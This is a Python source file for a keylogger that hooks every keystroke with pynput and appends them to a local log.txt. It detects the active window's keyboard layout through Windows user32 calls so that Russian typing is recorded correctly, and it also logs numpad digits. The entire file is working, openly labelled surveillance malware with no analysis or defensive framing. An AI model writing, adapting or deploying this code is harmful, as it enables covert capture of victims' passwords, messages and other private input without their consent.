import os
import sys
import ctypes
from datetime import datetime

import pynput.keyboard


ru = ['й', 'ц', 'у', 'к', 'е', 'н', 'г', 'ш', 'щ', 'з', 'х','ъ', 'ф', 'ы', 'в', 'а', 'п', 'р', 'о', 'л', 'д', 'ж', 'э', 'я', 'ч', 'с', 'м', 'и', 'т', 'ь', 'б', 'ю',
        '!', '"', '№', ';', '%', ':', '?', '*', '(', ')', '_', '+']

en = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[',']', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', "'", 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.',
        '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+']

key_array = ['<96>', '<97>', '<98>', '<99>', '<100>', '<101>', '<102>', '<103>', '<104>', '<105>']

today_date = datetime.now()


def catch_keyboard_layout():
    try:
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        curr_window = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
        key_lang_id = user32.GetKeyboardLayout(thread_id)
        lang_id = key_lang_id & (2 ** 16 - 1)
        lang_id_hex = hex(lang_id)
        if lang_id_hex == '0x409':
            return 'EN'
        if lang_id_hex == '0x419':
            return 'RU'
    except:
        pass


def logging(key):
    with open('log.txt', 'a') as f:
        try:
            current_key = str(key.char)
            lang = catch_keyboard_layout()
            # num lock клавиатура
            if key.char == None:
                current_key = '{}'.format(key)
                if current_key in key_array:
                    search_index = key_array.index(current_key)
                    current_key = str(search_index)
                    f.write(current_key)
            if lang == 'RU':
                for i in en:
                    if current_key == i:
                        current_key = ru[en.index(i)]
                        f.write(current_key)
            else:
                f.write(current_key)

        except AttributeError:
            if key == key.space:
                current_key = ' '
                f.write(current_key)
            else:
                current_key = ' ' + str(key) + ' '
                # шифты, контролы, бэкспейс, таб и Ф-ки
                #f.write(current_key)
                print(current_key)
    f.close()


def start():
    keyboard_listener = pynput.keyboard.Listener(logging)
    with keyboard_listener:
        keyboard_listener.join()

if __name__ == '__main__':
    with open('log.txt', 'w') as f:
        f.write('Keylogger started at {}'.format(today_date.strftime("date %d-%m-%Y time %H:%M")) + '\n\n')
    f.close()
    start()
